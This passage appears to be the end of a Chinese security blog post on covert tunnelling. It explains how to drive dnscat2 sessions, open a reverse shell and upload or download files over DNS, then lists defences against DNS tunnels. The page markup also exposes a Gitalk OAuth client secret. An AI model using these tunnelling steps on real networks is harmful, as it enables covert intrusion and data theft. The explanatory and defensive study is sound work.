+<p>其中0是server端主控，1是我们刚才运行连接上来的客户端。<br>&emsp;使用session -i id，进入到某个连接上来的client的session中，我们使用help命令，看一下dnscat支持的功能：<img data-src="//tvax3.sinaimg.cn/large/006Glg0Bly1gosx3jgp53j30ug0jkq5q.jpg" alt=""><br>使用shell命令创建一个反弹shell。这个反弹shell是创建了另外一个会话，我们需要使用<code>ctrl + z</code>退出当前会话，然后进入对应的反弹shell会话中,或者直接 <code>session -i id</code>到指定的会话中去。<img data-src="//tvax4.sinaimg.cn/large/006Glg0Bly1gosx7u6re5j30vq0iawht.jpg" alt=""></p>
+<p>然后还有其它很多命令，都可以去尝试一下。如<code>upload</code>、<code>download</code>等。</p>
+<h4 id="0x04-预防DNS隧道攻击的办法"><a href="#0x04-预防DNS隧道攻击的办法" class="headerlink" title="0x04 预防DNS隧道攻击的办法"></a>0x04 预防DNS隧道攻击的办法</h4><p>防御隧道攻击并非易事，特别是防御DNS隧道攻击。以下是常见的预防DNS隧道办法。</p>
+<ol>
+<li>禁止网络中的任何人向外部服务器发送DNS请求，只允许与受信任的dns服务器通信。</li>
+<li>没有人会将txt作为解析请求发送给DNS，但是dnscat2和邮件服务器/网关会这样，所以我们可以将邮件服务器/网关列入白名单然后阻止其它传入传出流量中的txt请求。</li>
+<li>跟踪用户的DNS查询次数，如果达到阈值就生成相应报告。</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>信安小蚂蚁
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://mayi077.github.io/2021/03/22/%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E4%B9%8B-%E5%BA%94%E7%94%A8%E5%B1%82/" title="隐藏通信隧道技术之 应用层">https://mayi077.github.io/2021/03/22/隐藏通信隧道技术之-应用层/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>ZERO</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+     <div>
+       
+         ﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+         
+      </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i>内网学习</a>
+              <a href="/tags/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/" rel="tag"><i class="fa fa-tag"></i>隧道技术</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/03/20/%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF-%E4%B8%AD-%E4%B9%8B-%E4%BC%A0%E8%BE%93%E5%B1%82/" rel="prev" title="隐藏通信隧道技术之传输层">
+      <i class="fa fa-chevron-left"></i> 隐藏通信隧道技术之传输层
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/03/24/%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E4%B9%8BSOCKS%E4%BB%A3%E7%90%86/" rel="next" title="隐藏隧道技术之SOCKS代理">
+      隐藏隧道技术之SOCKS代理 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-SSH协议"><span class="nav-number">1.</span> <span class="nav-text">0x01 SSH协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1、本地转发"><span class="nav-number">1.1.</span> <span class="nav-text">1、本地转发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2、远程转发"><span class="nav-number">1.2.</span> <span class="nav-text">2、远程转发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3、动态转发"><span class="nav-number">1.3.</span> <span class="nav-text">3、动态转发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4、预防SSH隧道攻击的思路"><span class="nav-number">1.4.</span> <span class="nav-text">4、预防SSH隧道攻击的思路</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-HTTP-HTTPS-协议"><span class="nav-number">2.</span> <span class="nav-text">0x02 HTTP&#x2F;HTTPS 协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-DNS协议"><span class="nav-number">3.</span> <span class="nav-text">0x03 DNS协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1、查看DNS的连通性"><span class="nav-number">3.1.</span> <span class="nav-text">1、查看DNS的连通性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2、dnscat2"><span class="nav-number">3.2.</span> <span class="nav-text">2、dnscat2</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-、dnscat2隧道的两种模式"><span class="nav-number">3.2.1.</span> <span class="nav-text">(1)、dnscat2隧道的两种模式</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-、dnscat2服务端的安装"><span class="nav-number">3.2.2.</span> <span class="nav-text">(2)、dnscat2服务端的安装</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-、服务端的安装"><span class="nav-number">3.2.3.</span> <span class="nav-text">(3)、服务端的安装</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Linux服务端安装"><span class="nav-number">3.2.3.1.</span> <span class="nav-text">Linux服务端安装</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#window服务端安装"><span class="nav-number">3.2.3.2.</span> <span class="nav-text">window服务端安装</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#直连模式"><span class="nav-number">3.2.4.</span> <span class="nav-text">直连模式</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#服务端运行"><span class="nav-number">3.2.4.1.</span> <span class="nav-text">服务端运行</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#中继模式"><span class="nav-number">3.2.5.</span> <span class="nav-text">中继模式</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#服务端"><span class="nav-number">3.2.5.1.</span> <span class="nav-text">服务端</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#客户端"><span class="nav-number">3.2.5.2.</span> <span class="nav-text">客户端</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用"><span class="nav-number">3.2.6.</span> <span class="nav-text">使用</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x04-预防DNS隧道攻击的办法"><span class="nav-number">3.3.</span> <span class="nav-text">0x04 预防DNS隧道攻击的办法</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="信安小蚂蚁"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">信安小蚂蚁</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">134</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">85</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/487280636@qq.com" title="E-Mail → 487280636@qq.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=487280636&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;487280636&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-instagram"></i>QQ</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/publicdomain/zero/1.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-zero.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">信安小蚂蚁</span>
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'Ov23li6cOHoOwCcszzi9',
+      clientSecret: '8f2a2156cf47355ba518edf71e62d5e1618dc229',
+      repo        : 'mayi077.github.io',
+      owner       : 'mayi077',
+      admin       : ['mayi077'],
+      id          : '7bb13d2d7381987fc5c1af3640ae0557',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
